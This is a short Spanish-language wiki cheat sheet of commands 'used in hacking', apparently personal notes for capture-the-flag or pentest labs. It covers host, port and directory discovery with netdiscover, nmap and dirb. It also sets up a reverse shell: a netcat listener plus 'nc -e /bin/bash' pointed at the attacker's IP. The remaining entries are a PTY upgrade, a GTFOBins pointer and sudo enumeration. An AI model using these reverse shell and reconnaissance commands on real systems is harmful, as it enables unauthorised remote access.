---
title: CheatSheet
description: Cheatsheet de todos los comandos usados en Hacking
published: true
date: 2024-11-11T14:26:03.405Z
tags: 
editor: markdown
dateCreated: 2024-11-11T14:26:03.405Z
---

# Comandos
Esta sección está dedicada a comandos usados de forma común en hacking.
## Detección
Para la detección de IPs, podremos hacer uso de varios comandos como:
```bash
sudo netdiscover -r (Rango de IP)
```
La detección de puertos, podemos hacer uso de NMap o Nessus. Con NMap seria el siguiente comando:
```bash
sudo nmap -sC -sV (IP)
```
Para la detección de subdirectorios podemos hacer uso de:
```bash
sudo dirb (Enlace)
```
## Securizar shell reversa
Una shell reversa, consiste en una shell ya segurizada que usaremos para poder escribir comandos, primero deberemos poner en nuestra máquina:
```bash
nc -lnvp (Puerto)
```

```bash
sudo nohup nc -e /bin/bash (Nuestra IP) &
```

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

```bash
nc -lnvp (Puerto)
```

```bash
stty raw -echo;fg
```
```bash
export TERM=xterm
```

gtfobins.github.io

```bash
sudo openvpn (archivovpn)
```

```bash
sudo -l
```
```bash
sudo strings (Fichero)
```
```bash
sudo netdiscover -r
```